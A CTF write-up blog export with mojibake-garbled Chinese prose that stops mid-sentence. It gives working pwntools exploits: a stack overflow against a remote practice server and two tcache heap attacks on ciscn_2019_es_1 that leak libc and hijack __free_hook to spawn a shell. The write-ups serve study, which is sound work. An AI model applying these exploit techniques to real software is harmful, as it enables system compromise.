    <link href="/2023/12/05/%E6%9D%82%E9%A1%B9/%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/"/>
    <url>/2023/12/05/%E6%9D%82%E9%A1%B9/%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/</url>
    
    <content type="html"><![CDATA[<p><strong>vmwareè‡ªå¸¦çš„vmtoolså®‰è£…äº†ä¹Ÿå¤åˆ¶ä¸è¿›æ¥</strong></p><p>è™šæ‹Ÿæœºæ‰§è¡Œå‘½ä»¤</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo apt-<span class="hljs-built_in">get</span> install <span class="hljs-keyword">open</span>-<span class="hljs-keyword">vm</span>-tools-desktop<br></code></pre></td></tr></table></figure><p>å¦‚æœæ‹–æ”¾æ–‡ä»¶çš„æ—¶å€™å‡ºç°äº†</p><p><img src="/img/problems/1.jpg"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo gedit <span class="hljs-regexp">/etc/g</span>dm3/custom.conf<br></code></pre></td></tr></table></figure><p>å°†<code>WaylandEnable=false</code>æ³¨é‡Šæ‰</p><p>æ®è¯´æ˜¯vmwareè¿˜æ²¡æœ‰æ”¯æŒubutnu22.04çš„é»˜è®¤æ¡Œé¢Wayland</p><h4 id="sleep-ï¼Ÿ"><a href="#sleep-ï¼Ÿ" class="headerlink" title="sleep ï¼Ÿ"></a>sleep ï¼Ÿ</h4><p>é¢˜ç›®ï¼š</p><p><a href="https://buuoj.cn/challenges#mrctf2020_easyrop">https://buuoj.cn/challenges#mrctf2020_easyrop</a></p><p>æœ¬æ¥æ˜¯å¾ˆç®€å•çš„ä¸€ä¸ªæº¢å‡º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><span class="hljs-comment">#r = process(&#x27;./mrctf2020_easyrop&#x27;)</span><br>r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25663</span>)<br>system_sh =<span class="hljs-number">0x000000000040072A</span><br>r.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br><span class="hljs-comment">#sleep(1)</span><br>r.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x300</span>)<br>r.sendline(<span class="hljs-string">b&#x27;7&#x27;</span>)<br><span class="hljs-comment">#sleep(1)</span><br>r.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>* <span class="hljs-number">0x12</span> + p64(system_sh))<br>r.interactive()<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯ä¸åŠ sleepæ— æ³•é€šè¿‡</p><p>æœ‰äººè¯´æ˜¯pythonåŒæ—¶å‘é€å¤šä¸ªå­—ç¬¦ä¸²æ—¶ä¼šåˆå¹¶(?)</p><p>é‚£ä»€ä¹ˆæ—¶å€™æƒ…å†µä¸‹éœ€è¦åœ¨sendlineå‰é¢åŠ ä¸€ä¸ªsleep</p><p>â€‹    [å·²è§£å†³] æ‰“æœ¬åœ°ä¸åŠ åº”è¯¥æ²¡äº‹ï¼Œæ‰“è¿œç¨‹çš„æ—¶å€™è‚¯å®šä¼šæœ‰ä¸€ç‚¹å»¶è¿Ÿï¼Œå‡å¦‚æ²¡æœ‰sendafterè¿™ä¸€ç±»çš„å‘é€ï¼Œå°±å¯èƒ½ä¼šé€ æˆåé¢çš„ä¹Ÿä¸€èµ·å‘é€äº†ï¼Œæ‰€ä»¥æ¯æ¬¡å†™expå‘é€çš„æ—¶å€™æœ€å¥½ç”¨sendafteræˆ–è€…sendlineafterè¿™æ ·çš„è¯å°±ä¸éœ€è¦å†æ‹…å¿ƒsleep(1)äº†</p><hr><h4 id="binwalkæå–å›ºä»¶æ—¶å¿«æ·æ–¹å¼æŒ‡å‘-dev-null"><a href="#binwalkæå–å›ºä»¶æ—¶å¿«æ·æ–¹å¼æŒ‡å‘-dev-null" class="headerlink" title="binwalkæå–å›ºä»¶æ—¶å¿«æ·æ–¹å¼æŒ‡å‘/dev/null"></a>binwalkæå–å›ºä»¶æ—¶å¿«æ·æ–¹å¼æŒ‡å‘/dev/null</h4><p>binwalkæå–å›ºä»¶æ—¶ä¼šæœ‰ä¸€ä¸ªwarning</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">WARNING: Symlink points outside of the extraction directory: <span class="hljs-regexp">/home/</span>kali<span class="hljs-regexp">/Desktop/</span>dir815_FW_101<span class="hljs-regexp">/_DIR-815 FW 1.01b14_1.01b14.bin.extracted/</span>squashfs-root<span class="hljs-regexp">/htdocs/</span>web<span class="hljs-regexp">/dlcfg.cgi -&gt; /</span>htdocs<span class="hljs-regexp">/cgibin; changing link target to /</span>dev/<span class="hljs-keyword">null</span> <span class="hljs-keyword">for</span> security purposes.<br></code></pre></td></tr></table></figure><p>ç”¨åˆ°è¿™ä¸ªå¿«æ·æ–¹å¼æ—¶è¦ä¿®æ”¹ä¸€ä¸‹</p><h4 id="sendlineafterçš„é—®é¢˜"><a href="#sendlineafterçš„é—®é¢˜" class="headerlink" title="sendlineafterçš„é—®é¢˜"></a>sendlineafterçš„é—®é¢˜</h4><p>è¦åŠ ä¸Šæ¢è¡Œç¬¦<code>\n</code>ï¼Œå¦åˆ™åŒ¹é…ä¸ä¸Š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.sendlineafter</span>(b<span class="hljs-string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>,...)<br></code></pre></td></tr></table></figure><h4 id="pythonè°ƒç”¨cåº“å‡½æ•°"><a href="#pythonè°ƒç”¨cåº“å‡½æ•°" class="headerlink" title="pythonè°ƒç”¨cåº“å‡½æ•°"></a>pythonè°ƒç”¨cåº“å‡½æ•°</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br>libc = cdll.LoadLibrary(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>libc.srand(<span class="hljs-number">0</span>)<br>libc.rand()%<span class="hljs-number">6</span> + <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h4 id="å®‰è£…ubuntu18ï¼Œpwndbgå®‰è£…ä¸ä¸Šï¼ˆsetup-shæ€»æœ‰é—®é¢˜ï¼‰"><a href="#å®‰è£…ubuntu18ï¼Œpwndbgå®‰è£…ä¸ä¸Šï¼ˆsetup-shæ€»æœ‰é—®é¢˜ï¼‰" class="headerlink" title="å®‰è£…ubuntu18ï¼Œpwndbgå®‰è£…ä¸ä¸Šï¼ˆsetup.shæ€»æœ‰é—®é¢˜ï¼‰"></a>å®‰è£…ubuntu18ï¼Œpwndbgå®‰è£…ä¸ä¸Šï¼ˆsetup.shæ€»æœ‰é—®é¢˜ï¼‰</h4><p>é€‰æ‹©ç”¨pwndbg releaseçš„å®‰è£…åŒ…ï¼Œå®‰è£…ä¹‹åæŠŠ<code>/usr/bin/gdb</code>ç»™æ”¹æˆ<code>/usr/ bin/pwndbg</code>çš„è½¯è¿æ¥</p><p>ç„¶ååœ¨è°ƒç”¨<code>gdb.attach</code>æ—¶å¼¹ä¸å‡ºæ¥æ–°çš„çª—å£ï¼š</p><p>é‡‡ç”¨tmuxè§£å†³ï¼Œå®‰è£…tmuxåï¼Œç¨‹åºå¼€å¤´åŠ ä¸Šä¸€å¥è¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;splitw&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>]<br></code></pre></td></tr></table></figure><p>ç„¶åå†å‘½ä»¤è¡Œå…ˆè¿è¡Œsudo tmuxï¼Œç„¶åè¿è¡Œexp.pyï¼Œå°±å¯ä»¥å¼¹å‡ºæ¥gdbäº†ã€‚</p><p>ç„¶åå‘ç°æ— æ³•æ»šåŠ¨é¼ æ ‡ï¼Œä½¿ç”¨<code>ctrl + shift + b + :</code>è¿›å…¥å‘½ä»¤æ¨¡å¼ï¼Œè¾“å…¥<code>set -g mouse on</code></p><p>å°±å¯ä»¥æ»šåŠ¨ç»ˆç«¯äº†</p>]]></content>
    
    
    <categories>
      
      <category>æ‚é¡¹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>Others</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tcache attack</title>
    <link href="/2023/12/01/ctf-pwn/tcache%20attack/"/>
    <url>/2023/12/01/ctf-pwn/tcache%20attack/</url>
    
    <content type="html"><![CDATA[<h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h2><p>tcache poisioningæŒ‡çš„æ˜¯ï¼Œä¿®æ”¹ç®¡ç†tcacheçš„chunkï¼ˆå°±æ˜¯é‚£ä¸ªchunkåˆ—è¡¨é‡Œé‚£ä¸ªå¤§å°ä¸º0x250ï¼Œåœ¨æœ€å‰é¢çš„ï¼‰åç§»0x10ä¸Šçš„å†…å®¹ã€‚</p><p>è¿™é‡Œæ˜¯å­˜å‚¨æ¯ä¸ªbinä¸­æœ‰å¤šå°‘ä¸ªchunkçš„åœ°æ–¹ï¼Œå…¨éƒ½æ”¹æˆ7ï¼ˆtcache binæ¯ä¸ªé‡Œæœ€å¤š7ä¸ªchunkï¼‰ï¼Œè¿™æ ·å†freeçš„æ—¶å€™ä¸ç®¡å¤šå¤§ï¼Œéƒ½ä¸ä¼šå†è¿›å…¥tcache binï¼Œç„¶åå°±å¯ä»¥é€šè¿‡æ³„éœ²unsorted binï¼Œå‡96ï¼ˆå› ä¸ºæœ‰tcacheï¼‰ï¼Œæ‹¿åˆ°mainarenaï¼Œå†å‡16æ‹¿åˆ°malloc_hookã€‚</p><blockquote><p>ä»¥å‰ä¸çŸ¥é“çš„æ˜¯ï¼Œå¦‚æœæŸä¸ªbiné‡Œçš„chunkä¸ªæ•°ä¸º0ï¼Œä½†æ˜¯æŒ‡é’ˆéç©ºï¼Œç»§ç»­mallocï¼Œä»–ä¼šå˜æˆè´Ÿçš„ï¼ˆ</p><p>è¯¦è§ä¸‹æ–‡exp</p></blockquote><p>ä¹Ÿç®—æ˜¯uafé‡Œçš„ä¸€ç±»</p><h3 id="ciscn-2019-es-1"><a href="#ciscn-2019-es-1" class="headerlink" title="ciscn_2019_es_1"></a>ciscn_2019_es_1</h3><p><a href="https://buuoj.cn/challenges#ciscn_2019_es_1">https://buuoj.cn/challenges#ciscn_2019_es_1</a></p><p>è¿™é“é¢˜å¯ä»¥ç”¨tcache poisioningæ¥è®©chunk freeæ—¶ç›´æ¥è¿›å…¥unsorted binï¼Œuafæ³„éœ²malloc hook</p><p>ä½†æ˜¯è¿™é“é¢˜åº”è¯¥æ˜¯è¢«é­”æ”¹è¿‡çš„ï¼ˆ</p><p>å› ä¸ºä»– heap number æœ€å¤§æ˜¯ 12ï¼Œå¯ä»¥å¼ºè¡Œå¡«æ»¡tcacheï¼ˆå°±ä¸ç”¨poisioningäº†ï¼‰ï¼Œå¹¶ä¸”è¾“å…¥çš„comparyâ€˜s callï¼ˆå®ƒæ˜¯ä¸æ˜¯æƒ³å†™companyå†™é”™äº†ã€‚ã€‚ã€‚ï¼‰å¹¶æ²¡æœ‰ç”¨ä¸Šã€‚ã€‚ã€‚æ‰€ä»¥æ‰è®¤ä¸ºæ˜¯ä¸€ä¸ªé­”æ”¹çš„é¢˜ç›®</p><p>ä¸‹é¢æ˜¯è¿™ä¸¤ç§åšæ³•</p><h4 id="å¡«æ»¡tcache"><a href="#å¡«æ»¡tcache" class="headerlink" title="å¡«æ»¡tcache"></a>å¡«æ»¡tcache</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.log_level = &#x27;DEBUG&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>p = process(<span class="hljs-string">&quot;./ciscn_2019_es_1&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">choice:<span class="hljs-built_in">int</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;choice:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(choice).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>(<span class="hljs-params">size:<span class="hljs-built_in">int</span>, content</span>):<br>    cmd(<span class="hljs-number">1</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Please input the size of compary&#x27;s name&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;please input name:&quot;</span>)<br>    p.send(content)<br>    p.recvuntil(<span class="hljs-string">b&quot;please input compary call:&quot;</span>)<br>    p.send(<span class="hljs-string">b&#x27;123\x00&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">index:<span class="hljs-built_in">int</span></span>):<br>    cmd(<span class="hljs-number">2</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index:<span class="hljs-built_in">int</span></span>):<br>    cmd(<span class="hljs-number">3</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    new(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 0</span><br>    new(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 1</span><br>    new(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 2</span><br>    new(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 3</span><br>    new(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 4</span><br>    new(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 5</span><br>    new(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 6</span><br>    new(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 7</span><br>    new(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 8</span><br>    new(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="hljs-comment"># idx 9</span><br><br>    free(<span class="hljs-number">0</span>)<br>    free(<span class="hljs-number">1</span>)<br>    free(<span class="hljs-number">2</span>)<br>    free(<span class="hljs-number">3</span>)<br>    free(<span class="hljs-number">4</span>)<br>    free(<span class="hljs-number">5</span>)<br>    free(<span class="hljs-number">6</span>) <span class="hljs-comment"># tcache çš„ 0x80 ä½ç½®è¢«å¡«æ»¡äº†</span><br>    <br>    free(<span class="hljs-number">7</span>)<br>    dump(<span class="hljs-number">7</span>)<br>    main_arena = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">96</span><br>    __malloc_hook = main_arena - <span class="hljs-number">0x10</span><br>    libc_base = __malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>    log.success(<span class="hljs-string">&#x27;libc base leak: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>    free(<span class="hljs-number">8</span>)<br>    free(<span class="hljs-number">8</span>)<br>    new(<span class="hljs-number">0x10</span>, p64(libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]))<br>    new(<span class="hljs-number">0x10</span>, p64(libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br>    free(<span class="hljs-number">9</span>)<br><br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure><h4 id="tcache-poisoning-1"><a href="#tcache-poisoning-1" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h4><p>ä¸€å¼€å§‹è¿ç»­4æ¬¡free 0 ï¼Œç„¶åä¸€æ¬¡newæ‹¿èµ°ä¸¤ä¸ªchunkï¼Œå¹¶å°†0.contend.fdè®¾ç½®ä¸ºheapbase+0x10ï¼ˆtcacheçš„é“¾è¡¨æŒ‡é’ˆæŒ‡å‘contentï¼‰</p><p>heapbaseæ˜¯æ³„éœ²çš„heapåœ°å€å–é«˜12ä½ï¼ˆé¡µçš„å¼€å¤´ï¼Ÿï¼‰</p><p>ç¬¬äºŒæ¬¡newçš„æ—¶å€™ï¼Œç¬¬ä¸€ä¸ªchunkè¿˜æ˜¯0.contentï¼Œç¬¬äºŒä¸ªchunkå°±æ˜¯heapbaseå¼€å§‹çš„äº†ï¼Œä¸€ä¸ª0å’Œ15ä¸ª7ï¼Œå°†é™¤äº†0x20çš„binå…¨éƒ¨å¡«æ»¡ï¼Œ0x20çš„binåé¢è¿˜è¦é uafæ”¹free_hookï¼Œä¸èƒ½ç½®ä¸º7ã€‚</p><p>è¿™æ—¶0x80çš„chunk freeä¹‹åå°±ä¼šè¿›å…¥unsorted binï¼Œä¹‹åå°±æ²¡åŒºåˆ«äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.log_level = &#x27;DEBUG&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>p = process(<span class="hljs-string">&quot;./ciscn_2019_es_1&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">choice:<span class="hljs-built_in">int</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;choice:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(choice).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>(<span class="hljs-params">size:<span class="hljs-built_in">int</span>, content</span>):<br>    cmd(<span class="hljs-number">1</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Please input the size of compary&#x27;s name&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;please input name:&quot;</span>)<br>    p.send(content)<br>    p.recvuntil(<span class="hljs-string">b&quot;please input compary call:&quot;</span>)<br>    p.send(<span class="hljs-string">b&#x27;123\x00&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">index:<span class="hljs-built_in">int</span></span>):<br>    cmd(<span class="hljs-number">2</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index:<span class="hljs-built_in">int</span></span>):<br>    cmd(<span class="hljs-number">3</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    new(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 0</span><br>    new(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 1</span><br>    new(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 2</span><br>    new(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="hljs-comment"># idx 3</span><br>    free(<span class="hljs-number">0</span>)<br>    free(<span class="hljs-number">0</span>)<br>    dump(<span class="hljs-number">0</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;name:\n&#x27;</span>)<br>    heap_leak = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    heap_base = heap_leak &amp; <span class="hljs-number">0xfffffffff000</span><br>    log.success(<span class="hljs-string">&#x27;heap base leak: &#x27;</span> + <span class="hljs-built_in">hex</span>(heap_base))<br>    free(<span class="hljs-number">0</span>)<br>    free(<span class="hljs-number">0</span>)<br>    <span class="hljs-comment">#gdb.attach(p)</span><br>    new(<span class="hljs-number">0x10</span>, p64(heap_base + <span class="hljs-number">0x10</span>)) <span class="hljs-comment"># idx 4</span><br>    <span class="hljs-comment">#gdb.attach(p)</span><br>    new(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span> + <span class="hljs-string">b&#x27;\x07&#x27;</span> * <span class="hljs-number">0xf</span>) <span class="hljs-comment"># idx 5, hijack the tcache</span><br>    <span class="hljs-comment">#gdb.attach(p)</span><br>    <span class="hljs-comment"># 0.content.fd -&gt; base + 0x10, 5.content = base+0x10</span><br>    <span class="hljs-comment"># every tcache bin is full (num=7) ,except 0x20(num=0)</span><br>    free(<span class="hljs-number">2</span>)<br>    dump(<span class="hljs-number">2</span>)<br>    main_arena = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">96</span><br>    __malloc_hook = main_arena - <span class="hljs-number">0x10</span><br>    libc_base = __malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>    log.success(<span class="hljs-string">&#x27;libc base leak: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>    free(<span class="hljs-number">0</span>)<br>    free(<span class="hljs-number">0</span>)<br>    new(<span class="hljs-number">0x10</span>, p64(libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]))<br>    <span class="hljs-comment">#gdb.attach(p)</span><br>    new(<span class="hljs-number">0x10</span>, p64(libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br>    <span class="hljs-comment"># tcachebinis.0x20 = -2 ï¼Œä¹Ÿå°±æ˜¯è¯´å³ä½¿è®¡æ•°çš„å˜é‡ä¸º0äº†ï¼Œåªè¦é“¾è¡¨æŒ‡é’ˆä¸ç©ºï¼Œå°±è¿˜èƒ½malloc</span><br>    gdb.attach(p)<br>    free(<span class="hljs-number">3</span>)<br><br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure><h2 id="tcache-key-æ³„éœ²"><a href="#tcache-key-æ³„éœ²" class="headerlink" title="tcache key æ³„éœ²"></a>tcache key æ³„éœ²</h2><p>åœ¨2.29ç‰ˆæœ¬ä»¥åï¼Œchunkè¢«freeåˆ°tcacheä¹‹åï¼Œfdå­—æ®µä¼šæŒ‡å‘tcacheç»“æ„ä½“ï¼ˆå°±æ˜¯é‚£ä¸ª0x290çš„chunkï¼‰ï¼Œåœ¨freeçš„æ—¶å€™çœ‹åˆ°bk=tcacheï¼Œä¼šæ£€æŸ¥tcacheä¸­æ˜¯å¦æœ‰è¿™ä¸ªå—</p><p>![](/img/tcache attack/1.jpg)</p><p>å› æ­¤double freeä¹‹å‰éœ€è¦æŠŠè¿™ä¸ªå­—æ®µç»™æ”¹æ‰ï¼Œæˆ–è€…ç”¨å®ƒæ¥æ³„éœ²å †åœ°å€</p><h3 id="diary"><a href="#diary" class="headerlink" title="diary"></a>diary</h3><h2 id="tcache-double-free"><a href="#tcache-double-free" class="headerlink" title="tcache double free"></a>tcache double free</h2><p>2.26 å’Œ 2.27è¾ƒæ—©çš„ç‰ˆæœ¬æ˜¯æ²¡æœ‰double free æ£€æŸ¥çš„ï¼Œå³å¯ä»¥è¿ç€2æ¬¡freeåŒä¸€ä¸ªchunk</p><h3 id="ciscn-final-3"><a href="#ciscn-final-3" class="headerlink" title="ciscn_final_3"></a>ciscn_final_3</h3><p><a href="https://buuoj.cn/challenges#ciscn_2019_final_3">https://buuoj.cn/challenges#ciscn_2019_final_3</a></p><p>libc2.27ï¼ˆæ— double freeæ£€æµ‹çš„ç‰ˆæœ¬ï¼‰ï¼Œåªæœ‰newå’Œdeleteï¼Œdeleteä¹‹åæ²¡æœ‰æ¸…ç©ºæŒ‡é’ˆï¼Œå¹¶ä¸”newä¹‹åè¾“å‡ºchunkçš„contentéƒ¨åˆ†çš„åœ°å€ã€‚ä¸å…è®¸åˆ†é…0x78ä»¥ä¸Šå¤§å°çš„chunkã€‚</p><p>æ•´ä½“æ€è·¯ï¼šé€šè¿‡double 